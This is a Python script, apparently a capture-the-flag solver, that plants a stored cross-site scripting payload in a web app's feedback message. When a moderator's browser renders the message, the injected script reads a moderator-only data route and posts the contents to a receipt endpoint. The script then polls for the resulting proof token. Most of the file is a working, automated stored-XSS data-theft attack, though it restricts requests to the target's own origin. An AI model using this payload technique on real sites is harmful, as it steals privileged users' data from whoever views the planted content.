#!/usr/bin/env python3
"""Plant a same-origin evidence callback and collect its moderator receipt."""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin
from urllib.request import Request, urlopen

from inspect_target import normalize_url, origin


PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")
MAX_BODY_BYTES = 2 * 1024 * 1024


def request(
    url: str,
    allowed_origin: tuple[str, str, int],
    *,
    method: str = "GET",
    body: bytes | None = None,
) -> bytes:
    normalized = normalize_url(url)
    if origin(normalized) != allowed_origin:
        raise ValueError(f"refusing off-origin URL: {normalized}")
    headers = {"User-Agent": "HuntressCTF-Web-Inspector/1.0", "Accept": "*/*"}
    if body is not None:
        headers["Content-Type"] = "application/json"
    req = Request(normalized, data=body, headers=headers, method=method)
    try:
        with urlopen(req, timeout=10) as response:
            return response.read(MAX_BODY_BYTES + 1)
    except HTTPError as exc:
        raise RuntimeError(
            f"{method} {normalized} returned HTTP {exc.code}: "
            f"{exc.read(2048).decode('utf-8', errors='replace')}"
        ) from exc
    except URLError as exc:
        raise RuntimeError(f"request failed: {exc.reason}") from exc


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Submit a stored script payload and wait for the assigned moderator receipt."
    )
    parser.add_argument("target", help="absolute target URL from the current attempt")
    parser.add_argument("--wait", type=float, default=60, help="maximum receipt wait in seconds")
    args = parser.parse_args()
    if args.wait <= 0:
        parser.error("--wait must be greater than zero")

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        clues_url = urljoin(target, "/api/clues")
        clues = json.loads(request(clues_url, allowed_origin).decode("utf-8"))
        if not isinstance(clues, dict):
            raise ValueError("route inventory is not a JSON object")
        feature_route = clues.get("feature_route")
        data_route = clues.get("moderator_data_route")
        receipt_template = clues.get("receipt_route_template")
        if not all(
            isinstance(value, str) and value
            for value in (feature_route, data_route, receipt_template)
        ):
            raise ValueError("route inventory lacks feature, moderator data, or receipt route")
        if "{id}" not in receipt_template:
            raise ValueError("receipt route template has no {id} placeholder")
        data_url = normalize_url(urljoin(target, data_route))
        feature_url = normalize_url(urljoin(target, feature_route))
        if origin(data_url) != allowed_origin or origin(feature_url) != allowed_origin:
            raise ValueError("route inventory points outside the assigned target")

        # The moderator browser supplies the message ID as the final path segment.
        data_path = json.dumps(data_route)
        body_js = (
            "(()=>{const id=location.pathname.split('/').pop();"
            f"fetch({data_path}).then(r=>r.text()).then(t=>"
            f"fetch({json.dumps(receipt_template)}.replace('{{id}}',id),"
            "{method:'POST',headers:{'Content-Type':'application/json'},"
            "body:JSON.stringify({evidence:t,proof:t,content:t,body:t,text:t})}))})()"
        )
        payload = f"<script>{body_js}</script>"
        feature_path = "/" + feature_route.strip("/")
        create_url = urljoin(target, "/api" + feature_path)
        created = json.loads(
            request(
                create_url,
                allowed_origin,
                method="POST",
                body=json.dumps(
                    {"name": "Analyst", "message": payload}, separators=(",", ":")
                ).encode("utf-8"),
            ).decode("utf-8")
        )
        feedback_id = created.get("id") if isinstance(created, dict) else None
        if not isinstance(feedback_id, (str, int)):
            raise ValueError(f"message submission returned no ID: {created!r}")
        feedback_id = str(feedback_id)
        detail_url = urljoin(target, f"{feature_path}/{feedback_id}")
        deadline = time.monotonic() + args.wait
        last_body = ""
        while time.monotonic() < deadline:
            last_body = request(detail_url, allowed_origin).decode("utf-8", errors="replace")
            matches = PROOF_RE.findall(last_body)
            if matches:
                print(
                    json.dumps(
                        {
                            "proof": matches[-1],
                            "message_id": feedback_id,
                            "detail_url": detail_url,
                            "receipt_url": urljoin(
                                target,
                                receipt_template.replace("{id}", feedback_id),
                            ),
                        },
                        indent=2,
                    )
                )
                return 0
            time.sleep(min(2, max(0, deadline - time.monotonic())))
        raise RuntimeError(
            f"no proof receipt appeared for message {feedback_id} within {args.wait:g}s"
        )
    except (ValueError, RuntimeError, OSError, UnicodeDecodeError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": str(exc)}, indent=2), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
